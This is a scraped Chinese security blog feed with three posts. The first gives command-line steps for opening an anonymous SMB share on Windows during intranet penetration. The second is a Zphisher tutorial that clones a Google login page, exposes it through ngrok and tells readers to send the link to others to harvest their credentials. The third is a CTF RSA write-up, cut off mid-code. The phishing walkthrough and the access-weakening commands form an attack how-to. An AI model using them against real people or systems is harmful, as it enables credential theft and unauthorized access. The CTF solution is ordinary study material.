<h2 id="00x03-通过命令行开启可匿名访问的文件共享服务器"><a class="anchor" href="#00x03-通过命令行开启可匿名访问的文件共享服务器">#</a> 00x03 通过命令行开启可匿名访问的文件共享服务器</h2>
<h3 id="1启用guest用户-2"><a class="anchor" href="#1启用guest用户-2">#</a> 1. 启用 Guest 用户</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>net user guest <span class="token operator">/</span>active<span class="token operator">:</span>yes</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210201016794.png" alt="image-20211210201016794" /></p>
<h3 id="2将everyone权限应用于匿名用户-2"><a class="anchor" href="#2将everyone权限应用于匿名用户-2">#</a> 2. 将 Everyone 权限应用于匿名用户</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">REG</span> <span class="token constant">ADD</span> <span class="token string">"HKLM\System\CurrentControlSet\Control\Lsa"</span> <span class="token operator">/</span>v EveryoneIncludesAnonymous <span class="token operator">/</span>t <span class="token constant">REG_DWORD</span> <span class="token operator">/</span>d <span class="token number">1</span> <span class="token operator">/</span>f</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210201045600.png" alt="image-20211210201045600" /></p>
<h3 id="3指定匿名共享文件的位置-2"><a class="anchor" href="#3指定匿名共享文件的位置-2">#</a> 3. 指定匿名共享文件的位置</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">REG</span> <span class="token constant">ADD</span> <span class="token string">"HKLM\System\CurrentControlSet\Services\LanManServer\Parameters"</span> <span class="token operator">/</span>v NullSessionShares <span class="token operator">/</span>t <span class="token constant">REG_MULTI_SZ</span> <span class="token operator">/</span>d smb <span class="token operator">/</span>f</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210201104716.png" alt="image-20211210201104716" /></p>
<h3 id="4将guest用户从策略拒绝从网络访问这台计算机中移除-2"><a class="anchor" href="#4将guest用户从策略拒绝从网络访问这台计算机中移除-2">#</a> 4. 将 Guest 用户从策略 “拒绝从网络访问这台计算机” 中移除</h3>
<p>导出组策略：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>secedit <span class="token operator">/</span><span class="token keyword">export</span> <span class="token operator">/</span>cfg gp<span class="token punctuation">.</span>inf <span class="token operator">/</span>quiet</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210201135696.png" alt="image-20211210201135696" /></p>
<p>修改文件 <code>gp.inf</code> ，将 <code>SeDenyNetworkLogonRight = Guest</code>  修改为 <code>SeDenyNetworkLogonRight =</code> ，保存</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210202023334.png" alt="image-20211210202023334" /></p>
<p>重新导入组策略：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>secedit <span class="token operator">/</span>configure <span class="token operator">/</span>db gp<span class="token punctuation">.</span>sdb <span class="token operator">/</span>cfg gp<span class="token punctuation">.</span>inf <span class="token operator">/</span>quiet</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210202111327.png" alt="image-20211210202111327" /></p>
<p>强制刷新组策略，立即生效 (否则，重启后生效)：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>gpupdate<span class="token operator">/</span>force</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210202229502.png" alt="image-20211210202229502" /></p>
<h3 id="5设置文件共享-2"><a class="anchor" href="#5设置文件共享-2">#</a> 5. 设置文件共享</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>icacls <span class="token constant">C</span><span class="token operator">:</span>\share\ <span class="token operator">/</span><span class="token constant">T</span> <span class="token operator">/</span>grant Everyone<span class="token operator">:</span>r</pre></td></tr><tr><td data-num="2"></td><td><pre>net share share<span class="token operator">=</span>c<span class="token operator">:</span>\share <span class="token operator">/</span>grant<span class="token operator">:</span>everyone<span class="token punctuation">,</span>full</pre></td></tr></table></figure><p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为 <code>//&lt;ip&gt;/smb</code></p>
<h2 id="00x04-开源代码"><a class="anchor" href="#00x04-开源代码">#</a> 00x04 开源代码</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzNnc3R1ZGVudC9JbnZva2UtQnVpbGRBbm9ueW1vdXNTTUJTZXJ2ZXI=">完整的开源 Powershell 代码的项目地址</span></p>
<p>代码在以下操作系统测试成功：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span> Windows <span class="token number">7</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span> Windows <span class="token number">8</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span> Windows <span class="token number">10</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">-</span> Windows Server <span class="token number">2012</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span> Windows Server <span class="token number">2012</span> <span class="token constant">R2</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">-</span> Windows Server <span class="token number">2016</span></pre></td></tr></table></figure><p>支持域环境和工作组环境的 <code>Windows</code>  操作系统</p>
<p>需要本地<strong>管理员</strong>权限执行</p>
<p>开启可匿名访问的文件共享服务器：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Invoke<span class="token operator">-</span>BuildAnonymousSMBServer <span class="token operator">-</span>Path c<span class="token operator">:</span>\share <span class="token operator">-</span>Mode Enable</pre></td></tr></table></figure><p>关闭可匿名访问的文件共享服务器：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Invoke<span class="token operator">-</span>BuildAnonymousSMBServer <span class="token operator">-</span>Path c<span class="token operator">:</span>\share <span class="token operator">-</span>Mode Disable</pre></td></tr></table></figure><p>关闭可匿名访问的文件共享服务器实现了以下操作：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span> 关闭指定目录的共享权限</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span> 禁用Guest用户</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span> 禁用将Everyone权限应用于匿名用户</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">-</span> 删除组策略中指定的匿名共享文件位置</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span> 将Guest用户添加至策略“拒绝从网络访问这台计算机”</pre></td></tr></table></figure><p>在导出组策略时，如果策略 “拒绝从网络访问这台计算机” 中的内容为空，那么不会有这一选项，当我们需要添加这个策略时，需要手动添加一行内容 <code>SeDenyNetworkLogonRight = Guest</code></p>
<p>在代码实现上，我采用了以下方法：</p>
<p>将 <code>SeDenyInteractiveLogonRight = Guest</code>  替换为</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>SeDenyNetworkLogonRight <span class="token operator">=</span> Guest</pre></td></tr><tr><td data-num="2"></td><td><pre>SeDenyInteractiveLogonRight <span class="token operator">=</span> Guest</pre></td></tr></table></figure><p>对应的 <code>Powershell</code>  示例代码：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">(</span>Get<span class="token operator">-</span>Content a<span class="token punctuation">.</span>txt<span class="token punctuation">)</span> <span class="token operator">-</span>replace <span class="token string">"SeDenyInteractiveLogonRight = Guest"</span><span class="token punctuation">,</span><span class="token string">"SeDenyNetworkLogonRight = Guest`r`nSeDenyInteractiveLogonRight = Guest"</span> <span class="token operator">|</span> Set<span class="token operator">-</span>Content <span class="token string">"a.txt"</span></pre></td></tr></table></figure><h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly8zZ3N0dWRlbnQuZ2l0aHViLmlvLyVFNiVCOCU5NyVFOSU4MCU4RiVFNiU4QSU4MCVFNSVCNyVBNy0lRTklODAlOUElRTglQkYlODclRTUlOTElQkQlRTQlQkIlQTQlRTglQTElOEMlRTUlQkMlODAlRTUlOTAlQUZXaW5kb3dzJUU3JUIzJUJCJUU3JUJCJTlGJUU3JTlBJTg0JUU1JThDJUJGJUU1JTkwJThEJUU4JUFFJUJGJUU5JTk3JUFFJUU1JTg1JUIxJUU0JUJBJUFC">渗透技巧 —— 通过命令行开启 Windows 系统的匿名访问共享</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>网络钓鱼工具 Zphisher 使用记录</title>
    <url>/article/65c9583.html</url>
    <content><![CDATA[<blockquote>
<p><code>Zphisher</code>  是一款功能强大的开源工具 Phishing Tool。用于对目标进行网络钓鱼攻击。 <code>Zphisher</code>  比社会工程工具包 ( <code>SET</code> ) 更容易。它包含一些由名为 Zphisher 的工具生成的模板，并为 Facebook、Instagram、谷歌、Snapchat、GitHub、雅虎、Proton 邮件、Spotify、Netflix、LinkedIn、WordPress、Origin、Steam、Microsoft 等 18 个流行网站提供钓鱼模板网页。如果有人愿意，它还提供了使用自定义模板的选项。该工具可以轻松执行网络钓鱼攻击。使用此工具，您可以在（广域网）中执行网络钓鱼。此工具可用于获取凭据，例如 id、密码。</p>
</blockquote>
<h3 id="zphisher的用途和特点"><a class="anchor" href="#zphisher的用途和特点">#</a> Zphisher 的用途和特点：</h3>
<ul>
<li>Zphisher 是开源工具。</li>
<li>Zphisher 是 Kali Linux 的一个工具。</li>
<li>Zphisher 用于网络钓鱼攻击。</li>
<li>Zphisher 工具是一个非常简单易用的工具。Zphisher 是用 bash 语言编写的。</li>
<li>Zphisher 工具是一个轻量级的工具。这不会占用额外的空间。</li>
<li>Zphisher 是用 bash 语言编写的。</li>
<li>Zphisher 为 30 多个网站创建了网络钓鱼页面。</li>
<li>Zphisher 创建流行网站的钓鱼页面，例如 Facebook、Instagram、Google、Snapchat、Github、雅虎、Protonmail、Spotify、Netflix、LinkedIn、WordPress、Origin、Steam、Microsoft 等</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220114154001706.png" alt="image-20220114154001706" /></p>
<h3 id="安装"><a class="anchor" href="#安装">#</a> 安装</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>git clone https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cnpmjs<span class="token punctuation">.</span>org<span class="token operator">/</span>htr<span class="token operator">-</span>tech<span class="token operator">/</span>zphisher<span class="token punctuation">.</span>git</pre></td></tr><tr><td data-num="2"></td><td><pre>cd zphisher</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span><span class="token operator">/</span>zphisher<span class="token punctuation">.</span>sh</pre></td></tr></table></figure><p>等待片刻</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220114155557284.png" alt="image-20220114155557284" /></p>
<h3 id="使用方法"><a class="anchor" href="#使用方法">#</a> 使用方法</h3>
<p>安装完成后，终端执行 <code>./zphisher.sh</code> <br />
 如下所示，选择要钓鱼的页面</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220114155644324.png" alt="image-20220114155644324" /></p>
<p>这里我们用 <code>Google</code>  邮箱进行测试，选择测试页面</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220114160137971.png" alt="image-20220114160137971" /></p>
<p>选择测试链接</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220114160224298.png" alt="image-20220114160224298" /></p>
<p>选择好之后，回车即可生成测试链接。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220114155825198.png" alt="image-20220114155825198" /><br />
 访问链接 效果如下</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220114155929546.png" alt="image-20220114155929546" /><br />
 输入测试信息后，效果如下</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220114160014346.png" alt="image-20220114160014346" /></p>
<p>也可以使用 <code>ngrok</code>  进行测试</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220114160416289.png" alt="image-20220114160416289" /></p>
<p>这时我们会看到，会给你给出一个由 <code>ngrok</code>  给出的链接</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220114160450200.png" alt="image-20220114160450200" /></p>
<p>也就是说给你搭建好了内网映射，将此链接发给别人，当其输入相关信息时，我么便可以得别人输入的信息。以此来完成网络钓鱼。</p>
<p>另外，在本地的 <code>ip.txt</code>  文件中还有访问 <code>IP</code>  记录</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220114161012380.png" alt="image-20220114161012380" /></p>
<h3 id="后记"><a class="anchor" href="#后记">#</a> 后记</h3>
<p>此外除了这些外国网站，我们还可以改成我们自己的页面。如 <code>QQ邮箱 QQ空间</code> 等。</p>
<h3 id="本文仅供网络安全学习研究请勿非法恶意攻击他人"><a class="anchor" href="#本文仅供网络安全学习研究请勿非法恶意攻击他人">#</a>  <code>本文仅供网络安全学习研究，请勿非法恶意攻击他人。</code></h3>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>陇原战疫2021网络安全大赛_Crypto部分WP</title>
    <url>/article/243479c5.html</url>
    <content><![CDATA[<h2 id="mostlycommom"><a class="anchor" href="#mostlycommom">#</a> mostlycommom</h2>
<p><strong><span class="exturl" data-url="aHR0cDovL3Rhc2sucHk=">task.py</span>:</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token punctuation">,</span> getPrime</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>flag <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="10"></td><td><pre>e1 <span class="token operator">=</span> <span class="token number">65536</span></pre></td></tr><tr><td data-num="11"></td><td><pre>e2 <span class="token operator">=</span> <span class="token number">270270</span></pre></td></tr><tr><td data-num="12"></td><td><pre>c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'message.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'n='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'c1='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'c2='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><strong>message.txt:</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>n<span class="token operator">=</span><span class="token number">122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503</span></pre></td></tr><tr><td data-num="2"></td><td><pre>c1<span class="token operator">=</span><span class="token number">39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673</span></pre></td></tr><tr><td data-num="3"></td><td><pre>c2<span class="token operator">=</span><span class="token number">43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277</span></pre></td></tr></table></figure><p>一眼就能看出是 rsa 中的共模攻击，但是 e1,e2 不互素，且公因数只有一个 2，直接尝试开方。</p>
<p><strong><span class="exturl" data-url="aHR0cDovL2V4cC5weQ==">exp.py</span>:</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">modulus</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    </pre></td></tr><tr><td data-num="6"></td><td><pre>    _<span class="token punctuation">,</span>s<span class="token punctuation">,</span>t <span class="token operator">=</span> gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2 <span class="token punctuation">,</span> t <span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n</pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    </pre></td></tr><tr><td data-num="10"></td><td><pre>N<span class="token operator">=</span><span class="token number">122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503</span></pre></td></tr><tr><td data-num="11"></td><td><pre>c1<span class="token operator">=</span><span class="token number">39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673</span></pre></td></tr><tr><td data-num="12"></td><td><pre>c2<span class="token operator">=</span><span class="token number">43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277</span></pre></td></tr><tr><td data-num="13"></td><td><pre>e1 <span class="token operator">=</span> <span class="token number">65536</span></pre></td></tr><tr><td data-num="14"></td><td><pre>e2 <span class="token operator">=</span> <span class="token number">270270</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>gcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>modulus<span class="token punctuation">(</span>N<span class="token punctuation">,</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">#SETCTF&#123;now_you_master_common_mode_attack&#125;</span></pre></td></tr></table></figure><h2 id="easytask"><a class="anchor" href="#easytask">#</a> easytask</h2>
<p><strong><span class="exturl" data-url="aHR0cDovL3Rhc2sucHk=">task.py</span>:</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span>V</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_random_U</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">get_U1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        A <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>                <span class="token keyword">if</span> i<span class="token operator">&lt;</span>j<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>                <span class="token keyword">if</span> i<span class="token operator">==</span>j<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">return</span> A</pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">get_U2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        A <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>                <span class="token keyword">if</span> i<span class="token operator">></span>j<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                <span class="token keyword">if</span> i<span class="token operator">==</span>j<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">return</span> A</pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">return</span> get_U1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span>get_U2<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    U <span class="token operator">=</span> get_random_U<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    V <span class="token operator">=</span> matrix<span class="token punctuation">(</span>V<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    W <span class="token operator">=</span> V<span class="token operator">*</span>U</pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">return</span> W</pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_random_r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    n <span class="token operator">=</span> <span class="token number">9</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    delta <span class="token operator">=</span> <span class="token number">4</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    r <span class="token operator">=</span> random_vector<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> n<span class="token punctuation">,</span> x<span class="token operator">=</span><span class="token operator">-</span>delta<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> y<span class="token operator">=</span>delta<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    r <span class="token operator">=</span> matrix<span class="token punctuation">(</span>r<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">return</span> r</pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    M <span class="token operator">=</span> <span class="token punctuation">[</span>getPrime<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token 